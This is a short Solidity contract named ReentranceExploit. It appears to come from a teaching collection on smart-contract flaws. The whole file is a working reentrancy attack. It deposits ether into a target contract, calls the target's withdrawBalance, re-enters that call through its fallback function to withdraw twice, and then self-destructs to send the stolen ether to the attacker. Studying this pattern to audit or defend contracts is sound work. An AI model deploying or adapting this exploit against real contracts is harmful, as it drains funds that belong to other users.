pragma solidity ^0.4.15;

contract ReentranceExploit {
    bool public attackModeIsOn=false; 
    address public vulnerable_contract;
    address public owner;

    function ReentranceExploit() public{
        owner = msg.sender;
    }

    function deposit(address _vulnerable_contract) public payable{
        vulnerable_contract = _vulnerable_contract ;
        // call addToBalance with msg.value ethers
        require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("addToBalance()"))));
    }

    function launch_attack() public{
        attackModeIsOn = true;
        // call withdrawBalance
        // withdrawBalance calls the fallback of ReentranceExploit
        require(vulnerable_contract.call(bytes4(sha3("withdrawBalance()"))));
    }  


    function () public payable{
        // atackModeIsOn is used to execute the attack only once
        // otherwise there is a loop between withdrawBalance and the fallback function
        if (attackModeIsOn){
            attackModeIsOn = false;
                require(vulnerable_contract.call(bytes4(sha3("withdrawBalance()"))));
        }
    }

    function get_money(){
        suicide(owner);
    }

}
